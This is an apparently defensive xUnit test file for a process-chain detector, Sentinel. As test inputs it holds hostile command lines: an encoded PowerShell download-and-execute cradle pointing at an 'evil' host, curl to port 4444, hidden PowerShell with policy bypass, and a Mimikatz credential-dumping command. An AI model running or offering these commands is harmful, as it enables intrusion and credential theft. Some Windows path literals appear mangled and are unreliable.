using Sentinel.Core.Detection;
using Sentinel.Core.Models;
using Sentinel.Core.Realtime;
using Xunit;

namespace Sentinel.Tests;

public class ProcessChainAnalyzerTests
{
    private static RealtimeEvent ProcessEvent(string pid, string name, string cmdline, uint? parent = null)
    {
        return new RealtimeEvent
        {
            TimestampUtc = DateTime.UtcNow,
            Kind = "process-created",
            Entity = pid,
            Message = $"Process created: {name} (PID {pid})",
            DetailsJson = System.Text.Json.JsonSerializer.Serialize(new
            {
                name,
                commandLine = cmdline,
                parentPid = parent,
            }),
        };
    }

    [Fact]
    public void EncodedPowerShell_IsFlaggedHigh()
    {
        var analyzer = new ProcessChainAnalyzer();
        var ev = analyzer.Observe(ProcessEvent("100", "powershell.exe",
            "powershell -nop -enc SQBFAFgADQAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAvAHgALgBwAHMAMQAnACkA"));
        var hit = Assert.Single(ev, e => e.Event == "chain-encoded-launch");
        Assert.Equal(Severity.High, hit.Severity);
    }

    [Fact]
    public void ScriptHost_Spawning_NetworkChild_IsFlagged()
    {
        var analyzer = new ProcessChainAnalyzer();
        analyzer.Observe(ProcessEvent("10", "cmd.exe", "cmd.exe /c whoami", null));
        var ev = analyzer.Observe(ProcessEvent("11", "curl.exe", "curl http://192.168.1.5:4444", 10));
        Assert.Contains(ev, e => e.Event == "chain-script-host-child");
    }

    [Fact]
    public void Office_Spawn_PowerShell_IsFlagged()
    {
        var analyzer = new ProcessChainAnalyzer();
        analyzer.Observe(ProcessEvent("10", "WINWORD.EXE", @"C:Program FilesMicrosoft OfficeootOffice16WINWORD.EXE", null));
        var ev = analyzer.Observe(ProcessEvent("11", "powershell.exe", "powershell -w hidden -ep bypass -e JAB4AA==", 10));
        Assert.Contains(ev, e => e.Event == "chain-office-macro-child");
    }

    [Fact]
    public void HiddenLauncher_IsFlagged()
    {
        var analyzer = new ProcessChainAnalyzer();
        var ev = analyzer.Observe(ProcessEvent("20", "powershell.exe", "powershell -w hidden -c \"Start-Process calc\"", null));
        Assert.Contains(ev, e => e.Event == "chain-hidden-launch");
    }

    [Fact]
    public void MimikatzCommandLine_IsFlaggedCritical()
    {
        var analyzer = new ProcessChainAnalyzer();
        var ev = analyzer.Observe(ProcessEvent("30", "mimikatz.exe", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", null));
        var hit = Assert.Single(ev, e => e.Event == "chain-credential-tool");
        Assert.Equal(Severity.Critical, hit.Severity);
    }

    [Fact]
    public void BenignProcess_ProducesNoEvidence()
    {
        var analyzer = new ProcessChainAnalyzer();
        var ev = analyzer.Observe(ProcessEvent("40", "notepad.exe", @"C:WindowsSystem32
otepad.exe C:	emp
ote.txt", null));
        Assert.Empty(ev);
    }

    [Fact]
    public void Ring_IsBounded()
    {
        var analyzer = new ProcessChainAnalyzer();
        for (uint i = 1; i <= 1500; i++)
        {
            analyzer.Observe(ProcessEvent(i.ToString(), "worker.exe", "worker.exe", null));
        }
        var lookup = analyzer.Lookup(1);
        Assert.Null(lookup); // oldest evicted
        Assert.NotNull(analyzer.Lookup(1499));
    }
}
